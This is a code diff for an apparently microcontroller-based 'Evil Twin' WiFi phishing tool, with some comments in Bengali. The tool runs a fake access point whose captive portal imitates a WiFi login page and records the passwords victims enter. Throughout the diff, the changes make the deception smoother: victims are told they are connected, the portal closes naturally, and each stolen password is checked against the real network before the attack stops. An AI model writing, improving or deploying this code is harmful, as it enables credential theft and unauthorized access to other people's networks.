@@ -23,6 +23,12 @@ bool isEvilTwinActive = false;
 String evilTwinSSID = "Free_WiFi";
 int evilTwinChannel = 6;
 
+// ========== Async WiFi Verification ==========
+bool pendingVerify = false;
+String pendingSSID = "";
+String pendingPassword = "";
+unsigned long pendingStartTime = 0;
+
 // ========== নেটওয়ার্ক স্ক্যান (সিম্পল) ==========
 String networkSSIDs[30];
 int networkChannels[30];
@@ -253,33 +259,30 @@ fetch('/getStats')
 .then(data=>{
 document.getElementById('credCount').textContent=data.credentials;
 document.getElementById('clientCount').textContent=data.clients;
-});
+})
+.catch(err=>console.error('Stats error:',err));
 
 fetch('/getCredentials')
 .then(r=>r.json())
 .then(data=>{
 let tbody=document.getElementById('credTable');
-tbody.innerHTML='';
 if(data.length===0){
-tbody.innerHTML='<tr><td colspan="4" style="text-align:center;color:#666">No data</td></tr>';
+tbody.innerHTML='<tr><td colspan="4" style="text-align:center;color:#666">No credentials captured yet</td></tr>';
 return;
 }
+tbody.innerHTML='';
 data.forEach(c=>{
 let row=tbody.insertRow();
 row.insertCell(0).textContent=c.timestamp;
 row.insertCell(1).textContent=c.ssid;
-row.insertCell(2).innerHTML=`<span style="color:#ff0000">${c.password}</span>`;
+row.insertCell(2).innerHTML=`<span style="color:#fdd663;font-weight:bold">${c.password}</span>`;
 row.insertCell(3).textContent=c.clientIP;
 });
+})
+.catch(err=>{
+console.error('Failed to fetch credentials:',err);
 });
 }
-
-setInterval(()=>{
-let status=document.getElementById('systemStatus').className;
-if(status.includes('twin')){
-updateStats();
-}
-},3000);
 
 function loadSettings(){
 fetch('/getSettings')
@@ -329,7 +332,13 @@ loadSettings();
 window.onload=function(){
 scanNetworks();
 loadSettings();
+updateStats();
 };
+
+// Auto-refresh stats and credentials every 2 seconds
+setInterval(()=>{
+updateStats();
+},2000);
 </script>
 </body>
 </html>
@@ -373,7 +382,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica N
 .connect-btn:disabled{background:#1a3a5c;color:#5a5a5a}
 .hidden{display:none}
 @media(min-width:768px){
-.wifi-page{max-width:500px;margin:0 auto;border:1px solid #2a2a2a}
+.wifi-page{max-width:500px;margin:0 auto}
 .header{border-top-left-radius:12px;border-top-right-radius:12px}
 }
 </style>
@@ -462,29 +471,42 @@ formData.append('ssid',ssid);
 formData.append('password',password);
 
 try{
-let response=await fetch('/login',{method:'POST',body:formData});
+let controller=new AbortController();
+let timeoutId=setTimeout(()=>controller.abort(),5000);
+
+let response=await fetch('/login',{method:'POST',body:formData,signal:controller.signal});
+clearTimeout(timeoutId);
 let data=await response.json();
 
-if(data.connected){
-// Password CORRECT - Redirect to router admin (192.168.0.1 or 192.168.1.1)
+if(data.success && data.connected){
+// Password submitted - Close captive portal naturally (like real WiFi)
 this.textContent='Connected';
-setTimeout(()=>{
-window.location.href='http://192.168.0.1';
-},1000);
+this.disabled=true;
+
+// Close captive portal naturally
+setTimeout(()=>{window.close()},300);
+setTimeout(()=>{window.location.href='http://connectivitycheck.gstatic.com/generate_204'},500);
 }else{
 // Password WRONG - Show error message
 this.disabled=false;
 this.textContent='Connect';
 document.getElementById('passwordInput').style.borderBottomColor='#e53935';
+errorMsg.style.color='#e53935';
 errorMsg.textContent='Incorrect password';
 errorMsg.classList.add('show');
 }
 }catch(e){
-this.disabled=false;
-this.textContent='Connect';
+// If fetch fails/times out, it means ESP is verifying (password was received)
+// Show as connected and close portal
+this.textContent='Connected';
+this.disabled=true;
+setTimeout(()=>{window.close()},300);
+setTimeout(()=>{window.location.href='http://connectivitycheck.gstatic.com/generate_204'},500);
 document.getElementById('passwordInput').style.borderBottomColor='#e53935';
+errorMsg.style.color='#e53935';
 errorMsg.textContent='Connection failed';
 errorMsg.classList.add('show');
+console.error('Error:',e);
 }
 };
 
@@ -582,17 +604,39 @@ void setupServer() {
         server.send(200, "text/html", adminDashboard);
     });
     
-    // Captive portal detection
+    // Captive portal detection - Return 204 when password validated to close portal
     server.on("/generate_204", HTTP_GET, []() {
-        server.send(200, "text/html", loginPage);
+        if(!isEvilTwinActive) {
+            // If Evil Twin stopped (password was correct), send 204 to close captive portal
+            server.send(204, "text/plain", "");
+        } else {
+            // If still active, show login page
+            server.send(200, "text/html", loginPage);
+        }
     });
     
     server.on("/hotspot-detect.html", HTTP_GET, []() {
-        server.send(200, "text/html", loginPage);
+        if(!isEvilTwinActive) {
+            server.send(204, "text/plain", "");
+        } else {
+            server.send(200, "text/html", loginPage);
+        }
     });
     
     server.on("/connecttest.txt", HTTP_GET, []() {
-        server.send(200, "text/html", loginPage);
+        if(!isEvilTwinActive) {
+            server.send(204, "text/plain", "");
+        } else {
+            server.send(200, "text/html", loginPage);
+        }
+    });
+    
+    server.on("/success.txt", HTTP_GET, []() {
+        server.send(204, "text/plain", "");
+    });
+    
+    server.on("/ncsi.txt", HTTP_GET, []() {
+        server.send(204, "text/plain", "");
     });
     
     // Network scan
@@ -645,7 +689,7 @@ void setupServer() {
         server.send(200, "application/json", json);
     });
     
-    // Login handler (capture credentials + auto-connect to original WiFi)
+    // Login handler (capture credentials + verify ASYNC)
     server.on("/login", HTTP_POST, []() {
         String ssid = evilTwinSSID;
         String password = server.arg("password");
@@ -659,75 +703,31 @@ void setupServer() {
             capturedCreds[credCount].clientIP = clientIP;
             credCount++;
             
-            Serial.println("\n[CREDENTIAL] 📧 Captured!");
-            Serial.printf("  Time: %s\n", capturedCreds[credCount-1].timestamp.c_str());
-            Serial.printf("  SSID: %s\n", ssid.c_str());
-            Serial.printf("  Password: %s\n", password.c_str());
-            Serial.printf("  Client IP: %s\n", clientIP.c_str());
-        }
-        
-        // Try to connect to original WiFi with captured password
-        Serial.println("\n[AUTO-CONNECT] Attempting to connect to original WiFi...");
-        Serial.printf("  SSID: %s\n", ssid.c_str());
-        
-        // Switch to AP+STA mode temporarily
-        WiFi.mode(WIFI_AP_STA);
-        delay(100);
-        
-        // Attempt connection
-        WiFi.begin(ssid.c_str(), password.c_str());
-        
-        int attempts = 0;
-        bool connected = false;
-        
-        // Wait up to 10 seconds for connection
-        while(attempts < 20 && WiFi.status() != WL_CONNECTED) {
-            delay(500);
-            attempts++;
-            Serial.print(".");
-        }
-        
-        if(WiFi.status() == WL_CONNECTED) {
-            connected = true;
-            Serial.println("\n[AUTO-CONNECT] ✅ Password is CORRECT!");
-            Serial.printf("  Connected to: %s\n", ssid.c_str());
-            Serial.printf("  IP Address: %s\n", WiFi.localIP().toString().c_str());
-            
-            // Stop Evil Twin automatically
-            Serial.println("\n[AUTO-STOP] Stopping Evil Twin attack...");
-            dnsServer.stop();
-            WiFi.softAPdisconnect(true);
-            delay(500);
-            
-            // Switch to full STA mode
-            WiFi.mode(WIFI_STA);
-            isEvilTwinActive = false;
-            
-            Serial.println("[AUTO-STOP] ✅ Evil Twin stopped");
-            Serial.println("[AUTO-STOP] ✅ Victim will connect to original network");
-            Serial.println("\n╔══════════════════════════════════════════╗");
-            Serial.println("║   PASSWORD VALIDATED & ATTACK STOPPED   ║");
-            Serial.println("╚══════════════════════════════════════════╝\n");
-            
-            // Restore Admin AP after 5 seconds
-            delay(5000);
-            WiFi.mode(WIFI_AP);
-            WiFi.softAP(adminSSID.c_str(), adminPassword.c_str(), 1, hideSSID, 8);
-            Serial.println("\n[SYSTEM] Admin AP restored for next attack");
-            
+            Serial.println("\n╔════════════════════════════════════════╗");
+            Serial.println("║       🎣 CREDENTIAL CAPTURED!         ║");
+            Serial.println("╚════════════════════════════════════════╝");
+            Serial.printf("  📅 Time:     %s\n", capturedCreds[credCount-1].timestamp.c_str());
+            Serial.printf("  📡 SSID:     %s\n", ssid.c_str());
+            Serial.printf("  🔑 Password: %s\n", password.c_str());
+            Serial.printf("  📱 Client:   %s\n", clientIP.c_str());
+            Serial.printf("  📊 Total:    %d captured\n", credCount);
+            Serial.println("════════════════════════════════════════");
         } else {
-            connected = false;
-            Serial.println("\n[AUTO-CONNECT] ❌ Password is INCORRECT");
-            Serial.println("[AUTO-CONNECT] Evil Twin continues running...");
-            
-            // Restore AP mode
-            WiFi.disconnect();
-            WiFi.mode(WIFI_AP);
+            Serial.println("\n[WARNING] ⚠️ Credential storage full (50/50)");
         }
         
-        // Send response with connection status
-        String response = "{\"success\":true,\"connected\":" + String(connected ? "true" : "false") + "}";
-        server.send(200, "application/json", response);
+        // *** SEND RESPONSE FIRST before doing anything ***
+        // Tell client "connected" immediately so captive portal closes naturally
+        // The actual verification will happen async in loop()
+        server.send(200, "application/json", "{\"success\":true,\"connected\":true}");
+        
+        // Queue async verification - will be processed in loop()
+        pendingVerify = true;
+        pendingSSID = ssid;
+        pendingPassword = password;
+        pendingStartTime = millis();
+        
+        Serial.println("\n[VERIFY] Password queued for async verification...");
     });
     
     // Get statistics
@@ -745,6 +745,8 @@ void setupServer() {
     
     // Get credentials
     server.on("/getCredentials", HTTP_GET, []() {
+        Serial.printf("[API] /getCredentials called - Returning %d credentials\n", credCount);
+        
         DynamicJsonDocument doc(2048);
         JsonArray creds = doc.to<JsonArray>();
         
@@ -883,6 +885,93 @@ void setup() {
     Serial.println("╚══════════════════════════════════════════╝\n");
 }
 
+// ========== Async WiFi Verification ==========
+void verifyPassword() {
+    if(!pendingVerify) return;
+    
+    Serial.println("\n[VERIFY] Starting async password verification...");
+    Serial.printf("  SSID: %s\n", pendingSSID.c_str());
+    Serial.printf("  Password: %s\n", pendingPassword.c_str());
+    
+    // Wait 2 seconds for client to receive the response and close portal
+    delay(2000);
+    
+    // Stop DNS to prevent interference
+    dnsServer.stop();
+    
+    // Switch to AP+STA mode to try connecting while keeping AP alive temporarily
+    WiFi.mode(WIFI_AP_STA);
+    delay(200);
+    
+    // Attempt connection to original WiFi
+    WiFi.begin(pendingSSID.c_str(), pendingPassword.c_str());
+    
+    int attempts = 0;
+    bool connected = false;
+    
+    // Wait up to 15 seconds
+    while(attempts < 30 && WiFi.status() != WL_CONNECTED) {
+        delay(500);
+        attempts++;
+        Serial.print(".");
+    }
+    
+    if(WiFi.status() == WL_CONNECTED) {
+        connected = true;
+        Serial.println("\n\n╔══════════════════════════════════════════╗");
+        Serial.println("║     ✅ PASSWORD CORRECT - VERIFIED!     ║");
+        Serial.println("╚══════════════════════════════════════════╝");
+        Serial.printf("  📡 Connected to: %s\n", pendingSSID.c_str());
+        Serial.printf("  🌐 IP Address: %s\n", WiFi.localIP().toString().c_str());
+        Serial.printf("  🔑 Password: %s\n", pendingPassword.c_str());
+        
+        // Disconnect from original WiFi (we just needed to verify)
+        WiFi.disconnect(true);
+        delay(500);
+        
+        // Stop Evil Twin
+        WiFi.softAPdisconnect(true);
+        isEvilTwinActive = false;
+        delay(500);
+        
+        Serial.println("\n[AUTO-STOP] ✅ Evil Twin stopped - Password verified!");
+        Serial.println("[SYSTEM] Restoring Admin AP...");
+        
+        // Restore Admin AP
+        WiFi.mode(WIFI_AP);
+        delay(200);
+        WiFi.softAP(adminSSID.c_str(), adminPassword.c_str(), 1, hideSSID, 8);
+        
+        Serial.println("[SYSTEM] ✅ Admin AP restored");
+        Serial.println("\n╔══════════════════════════════════════════╗");
+        Serial.println("║   ATTACK COMPLETE - CHECK CREDENTIALS   ║");
+        Serial.println("╚══════════════════════════════════════════╝\n");
+        
+    } else {
+        Serial.println("\n[VERIFY] ❌ Password INCORRECT");
+        Serial.println("[VERIFY] Evil Twin continues running...");
+        
+        // Disconnect failed attempt
+        WiFi.disconnect(true);
+        delay(200);
+        
+        // Restore Evil Twin AP
+        WiFi.mode(WIFI_AP);
+        delay(200);
+        WiFi.softAP(evilTwinSSID.c_str(), nullptr, evilTwinChannel, 0, 8);
+        
+        // Restart DNS for captive portal
+        dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
+        
+        Serial.println("[VERIFY] ✅ Evil Twin restored and running");
+    }
+    
+    // Clear pending
+    pendingVerify = false;
+    pendingSSID = "";
+    pendingPassword = "";
+}
+
 // ========== LOOP ফাংশন (Optimized) ==========
 
 void loop() {
@@ -892,6 +981,11 @@ void loop() {
     // Handle DNS requests (captive portal)
     if(isEvilTwinActive) {
         dnsServer.processNextRequest();
+    }
+    
+    // Check for pending password verification
+    if(pendingVerify && millis() - pendingStartTime > 1000) {
+        verifyPassword();
     }
     
     // Memory check (every 30 seconds)
